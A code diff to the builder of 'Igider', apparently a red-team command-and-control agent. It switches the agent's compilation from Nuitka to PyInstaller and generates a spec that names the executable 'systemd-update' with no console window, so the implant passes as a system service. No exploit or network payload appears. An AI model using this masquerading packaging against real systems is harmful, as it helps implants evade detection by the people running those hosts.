@@ -208,167 +208,184 @@ class Igider(PayloadType):
         return powershell_loader
 
 
+    def _create_pyinstaller_spec(self, target_os: str) -> str:
+        """Generate PyInstaller spec file for executable creation (cross-platform, no console, no icon)."""
+
+        exe_name = "systemd-update"  # executable name
+        console_mode = "False"       # no console
+
+        # Modules to forcibly include
+        hidden_imports = [
+            'json',
+            'ssl',
+            'base64',
+            'threading',
+            'time',
+            'urllib.request',
+            'urllib.parse',
+            'platform',
+            'calendar',
+            'datetime',
+            'ipaddress',
+            'locale',
+            'zlib',
+            'bz2',
+            'lzma',
+            'shutil',
+            'tempfile',
+            'nturl2path',
+            'queue',
+            'hmac',
+            'ctypes',
+            'signal',
+            'subprocess',
+            'csv',
+            'pathlib',
+            'zipfile',
+            'textwrap',
+            'ast',
+            'opcode',
+            'dis',
+            'token',
+            'tokenize',
+            'linecache',
+            'inspect',
+            'importlib',
+            'importlib.metadata',
+            'importlib.resources',
+            'typing',
+            'pkgutil',
+            'tkinter',
+            'psutil',
+            'cryptography',
+            'cryptography.hazmat.backends',
+            'cryptography.hazmat.primitives.ciphers',
+            'cryptography.hazmat.primitives.ciphers.algorithms',
+            'cryptography.hazmat.primitives.ciphers.modes',
+            'email',
+            'email.errors',
+            'email.quoprimime',
+            'email.base64mime',
+            'email.encoders',
+            'email.charset',
+            'email.header',
+            'email._parseaddr',
+            'email.utils',
+            'email._policybase',
+            'email.feedparser',
+            'email.parser',
+            'email._encoded_words',
+            'email.iterators',
+            'email.message',
+            'http',
+            'http.client',
+        ]
+
+        hidden_imports_str = ", ".join(f"'{mod}'" for mod in hidden_imports)
+
+        spec_content = textwrap.dedent(f"""
+            # -*- mode: python ; coding: utf-8 -*-
+            block_cipher = None
+
+            a = Analysis(
+                ['main.py'],
+                pathex=[],
+                binaries=[],
+                datas=[],
+                hiddenimports=[{hidden_imports_str}],
+                hookspath=[],
+                hooksconfig={{}},
+                runtime_hooks=[],
+                excludes=[],
+                cipher=block_cipher,
+                noarchive=False,
+            )
+
+            pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
+
+            exe = EXE(
+                pyz,
+                a.scripts[0],
+                a.binaries,
+                a.zipfiles,
+                a.datas,
+                [],
+                name='{exe_name}',
+                debug=False,
+                bootloader_ignore_signals=False,
+                strip=False,
+                upx=True,
+                upx_exclude=[],
+                runtime_tmpdir=None,
+                console={console_mode},
+                disable_windowed_traceback=False,
+                target_arch='x86_64',
+                codesign_identity=None,
+                entitlements_file=None
+            )
+        """)
+
+        return spec_content
+
+
+
 
     def _build_executable(self, code: str) -> bytes:
-        """Build standalone Linux executable using Nuitka with improved error handling."""
-        
-        # Check if Nuitka is installed
+        # Check if PyInstaller is available
         try:
-            result = subprocess.run([sys.executable, "-m", "nuitka", "--version"],
-                                capture_output=True, check=True, timeout=10)
-            self.logger.info(f"Nuitka version: {result.stdout.decode().strip()}")
-        except subprocess.TimeoutExpired:
-            raise Exception("Nuitka version check timed out")
-        except (subprocess.CalledProcessError, FileNotFoundError) as e:
-            raise Exception(f"Nuitka is not installed or not working: {e}")
+            subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
+                        capture_output=True, check=True)
+        except (subprocess.CalledProcessError, FileNotFoundError):
+            raise Exception("PyInstaller is not installed")
 
-        with tempfile.TemporaryDirectory(prefix="igider_build_") as temp_dir:
-            self.logger.info(f"Using temporary directory: {temp_dir}")
-            
-            # Write the main Python file
-            main_file = os.path.join(temp_dir, "igider.py")
-            try:
-                with open(main_file, "w", encoding='utf-8') as f:
-                    f.write(code)
-                self.logger.info(f"Written main file: {main_file}")
-            except Exception as e:
-                raise Exception(f"Failed to write main file: {e}")
+        with tempfile.TemporaryDirectory() as temp_dir:
+            # Create main Python file
+            main_py = os.path.join(temp_dir, "main.py")
+            with open(main_py, "w") as f:
+                f.write(code)
 
-            # Expected output path (Nuitka will create this)
-            exe_path = os.path.join(temp_dir, "igider.bin")
+            exe_name = "systemd-update"
+            exe_path = os.path.join(temp_dir, "dist", exe_name)
 
-            # Optimized Nuitka command with better resource management
             cmd = [
-                sys.executable, "-m", "nuitka",
+                sys.executable, "-m", "PyInstaller",
                 "--onefile",
-                "--standalone",
-                main_file,
-                "--enable-plugin=anti-bloat",
-                
-                # Metadata
-                "--company-name=Offensy",
-                "--product-name=IGIDER",
-                "--file-version=1.0.0.0",
-                "--product-version=1.0.0.0",
-                "--file-description=Red Team Penetration Testing Agent",
-                "--copyright=Copyright © 2024 Offensy. All rights reserved.",
-                "--trademarks=IGIDER",
-                
-                # Exclude problematic modules
-                "--noinclude-setuptools-mode=error",
-                "--noinclude-pytest-mode=error",
-                "--noinclude-IPython-mode=error",
-                
-                # Memory and performance optimizations
-                "--low-memory",
-                "--jobs=2",  # Limit parallel jobs to prevent memory issues
-                
-                # Core modules (reduced list for faster builds)
-                "--include-module=sys",
-                "--include-module=os",
-                "--include-module=time",
-                "--include-module=json",
-                "--include-module=socket",
-                "--include-module=ssl",
-                "--include-module=base64",
-                "--include-module=subprocess",
-                "--include-module=threading",
-                "--include-module=ctypes",
-                "--include-module=signal",
-                "--include-module=psutil",
-                "--include-module=pefile",
-                
-                # Cryptography (essential for security tools)
-                "--include-package=cryptography",
-                "--include-module=cryptography.hazmat.primitives.ciphers",
-                "--include-module=cryptography.hazmat.primitives.ciphers.algorithms",
-                "--include-module=cryptography.hazmat.primitives.ciphers.modes",
-                "--include-module=cryptography.hazmat.backends",
-                
-                # Output configuration
-                f"--output-dir={temp_dir}",
-                "--output-filename=igider.bin"
+                "--name", exe_name,
+                "--distpath", os.path.join(temp_dir, "dist"),
+                "--workpath", os.path.join(temp_dir, "build"),
+                "--specpath", temp_dir,
+                "--console",
+                main_py
             ]
 
-            self.logger.info("Starting Nuitka compilation...")
-            self.logger.debug(f"Nuitka command: {' '.join(cmd)}")
-            
             try:
-                # Increase timeout and add better process management
+                self.logger.info(f"Running PyInstaller: {' '.join(cmd)}")
                 result = subprocess.run(
-                    cmd, 
-                    capture_output=True, 
-                    text=True, 
-                    cwd=temp_dir, 
-                    timeout=1200,  # 20 minutes timeout
-                    env={**os.environ, 'PYTHONUNBUFFERED': '1'}
+                    cmd,
+                    capture_output=True,
+                    text=True,
+                    cwd=temp_dir,
+                    timeout=300
                 )
-                
-                # Log output for debugging
-                if result.stdout:
-                    self.logger.debug(f"Nuitka stdout: {result.stdout}")
-                if result.stderr:
-                    self.logger.warning(f"Nuitka stderr: {result.stderr}")
-                    
-            except subprocess.TimeoutExpired as e:
-                self.logger.error("Nuitka compilation timed out")
-                raise Exception(f"Nuitka build timed out after 20 minutes: {e}")
-            except Exception as e:
-                raise Exception(f"Nuitka execution failed: {e}")
 
-            # Check build result
-            if result.returncode != 0:
-                error_msg = f"Nuitka build failed with return code {result.returncode}"
-                if result.stderr:
-                    error_msg += f": {result.stderr}"
-                self.logger.error(error_msg)
-                raise Exception(error_msg)
+                if result.returncode != 0:
+                    raise Exception(f"PyInstaller failed: {result.stderr}")
 
-            # Verify executable exists
-            if not os.path.exists(exe_path):
-                # Try alternative paths that Nuitka might use
-                alternative_paths = [
-                    os.path.join(temp_dir, "igider.dist", "igider.bin"),
-                    os.path.join(temp_dir, "igider"),
-                    os.path.join(temp_dir, "igider.exe")  # Just in case
-                ]
-                
-                for alt_path in alternative_paths:
-                    if os.path.exists(alt_path):
-                        exe_path = alt_path
-                        self.logger.info(f"Found executable at alternative path: {exe_path}")
-                        break
-                else:
-                    # List directory contents for debugging
-                    try:
-                        contents = os.listdir(temp_dir)
-                        self.logger.error(f"Directory contents: {contents}")
-                    except Exception as e:
-                        self.logger.error(f"Cannot list directory: {e}")
-                        
-                    raise Exception(f"Executable not found. Expected at {exe_path}")
+                if not os.path.exists(exe_path):
+                    raise Exception(f"Executable not found at {exe_path}")
 
-            # Verify executable is valid
-            try:
-                file_size = os.path.getsize(exe_path)
-                self.logger.info(f"Executable built successfully. Size: {file_size} bytes")
-                
-                if file_size == 0:
-                    raise Exception("Executable file is empty")
-                    
-            except Exception as e:
-                raise Exception(f"Executable validation failed: {e}")
+                # Optional: log file type
+                try:
+                    ftype = subprocess.check_output(["file", exe_path]).decode().strip()
+                    self.logger.info(f"Generated executable type: {ftype}")
+                except Exception:
+                    pass
 
-            # Read and return the executable
-            try:
                 with open(exe_path, "rb") as f:
-                    executable_data = f.read()
-                
-                self.logger.info(f"Successfully read executable ({len(executable_data)} bytes)")
-                return executable_data
-                
+                    return f.read()
+
             except Exception as e:
-                raise Exception(f"Failed to read executable: {e}")
+                raise Exception(f"Build failed: {str(e)}")
 
             
             
